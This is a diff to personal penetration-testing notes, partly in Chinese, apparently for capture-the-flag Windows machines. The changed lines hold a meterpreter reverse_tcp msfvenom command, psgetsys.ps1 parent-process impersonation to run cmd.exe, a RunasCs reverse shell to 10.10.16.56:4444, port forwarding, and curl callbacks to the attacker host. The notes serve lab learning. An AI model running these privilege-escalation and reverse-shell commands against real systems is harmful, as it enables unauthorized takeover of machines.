@@ -936,11 +936,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.56 lport=5959 -f 
 开了debug
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240424011203.png)
 
-`import-module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(552,"C:\windows\system32\cmd.exe")`
+```powershell
+import-module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(556,"C:\windows\system32\cmd.exe")
+```
 `[MyProcess]::CreateProcessFromParent(656,"c:\windows\system32\cmd.exe","")`
 
 `.\pov.exe 552 ".\RunasCs.exe cmd.exe -r 10.10.16.56:4444"`
-
 
 
 ```powershell
@@ -955,10 +956,14 @@ https://blog.csdn.net/m0_52742680/article/details/135905285?utm_medium=distribut
 portfwd add –l 5985 –p 5985 –r 127.0.0.1
 
 ```
-. .\psgetsys.ps1|ImpersonateFromParentPid -ppid 556 -command "cmd.exe" -cmdargs "/c curl 10.10.16.56:8000"
+. .\psgetsys.ps1 ;ImpersonateFromParentPid -ppid 556 -command "cmd.exe" -cmdargs "/c powershell.exe curl 10.10.16.56:8001"
+
+. .\psgetsys.ps1|ImpersonateFromParentPid -ppid 556 -command "cmd.exe" -cmdargs "/c curl 10.10.16.56:8001"
+
+. .\psgetsys.ps1|ImpersonateFromParentPid -ppid 556 -command "curl" -cmdargs "10.10.16.56:8001"
 ```
 
-. .\.ps1|ImpersonateFromParentPid -ppid 552 -command "cmd.exe" -cmdargs "/c curl 10.10.16.56"
+
 
 ### Manager
 #### user
